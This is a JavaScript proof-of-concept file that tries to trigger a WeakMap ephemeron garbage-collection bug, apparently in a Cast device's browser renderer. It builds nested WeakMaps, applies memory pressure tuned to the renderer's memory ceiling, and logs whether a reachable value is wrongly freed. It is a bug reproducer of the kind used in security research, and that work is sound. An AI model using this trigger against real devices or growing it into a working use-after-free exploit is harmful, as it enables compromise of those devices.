// 37975 with a REAL major collection behind it.
//
// Every earlier attempt to fire the ephemeron bug ran without a major GC, which is
// what the bug lives in. Pressure is applied the way that was measured to work:
// small chunks, yielded between steps so the Cast heartbeat survives, capped under
// the ~120-150 MB renderer ceiling.
var print = (typeof print === 'function') ? print : function () { };
function say(s) { print('[y37975] ' + s); }

var initKey = { init: 1 };
var level = 4;
var PER = 500000;   // 4 MB per chunk
var STEPS = 28;     // ~112 MB, under the measured ceiling

function hideWeakMap(map, level, initKey) {
  let prevMap = map, prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = new WeakMap();
    prevMap.set(prevKey, thisMap);
    let thisKey = { 'h': i };
    thisMap.set(prevKey, thisKey);
    prevMap = thisMap; prevKey = thisKey;
    if (i == level - 1) { let retMap = new WeakMap(); map.set(thisKey, retMap); return thisKey; }
  }
}
function getHiddenKey(map, level, initKey) {
  let prevMap = map, prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = prevMap.get(prevKey);
    let thisKey = thisMap.get(prevKey);
    prevMap = thisMap; prevKey = thisKey;
    if (i == level - 1) { return thisKey; }
  }
}
function setUpWeakMap(map) {
  let hk = hideWeakMap(map, level, initKey);
  let hiddenMap = map.get(hk);
  let map7 = new WeakMap(), map8 = new WeakMap(), map5 = new WeakMap();
  let k5 = { k5: 1 }, k7 = { k7: 1 }, k9 = { k9: 1 }, k8 = { k8: 1 }, v9 = {};
  map.set(k7, map7); map.set(k9, v9);
  hiddenMap.set(k5, map5); hiddenMap.set(hk, k5); map5.set(hk, k7);
  map7.set(k8, map8); map7.set(k7, k8); map8.set(k8, k9);
}

var rounds = 15;
var hits = 0;
var trial = 0;

function press(then) {
  var keep = [];
  var n = 0;
  function step() {
    n++;
    try { var a = new Array(PER); a.fill(1.1); keep.push(a); } catch (e) { }
    if (n < STEPS) { setTimeout(step, 25); return; }
    setTimeout(then, 80);      // let the collection settle
  }
  step();
}

function round() {
  trial++;
  var map1 = new WeakMap();
  setUpWeakMap(map1);
  press(function () {
    var observed;
    try {
      let hiddenKey = getHiddenKey(map1, level, initKey);
      let hiddenMap = map1.get(hiddenKey);
      let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
      let k8 = map1.get(k7).get(k7);
      let map8 = map1.get(k7).get(k8);
      observed = map1.get(map8.get(k8));
    } catch (e) { say('round ' + trial + ' threw ' + e.name); }
    if (observed === undefined) { hits++; }
    say('round ' + trial + ' ' + (observed === undefined ? 'FREED' : 'alive') +
        ' hits=' + hits);
    if (trial < rounds) { setTimeout(round, 150); return; }
    say('RESULT trials=' + trial + ' freed=' + hits +
        ' verdict=' + (hits > 0 ? 'FIRES' : 'no-fire'));
    say('done');
  });
}
say('begin');
round();
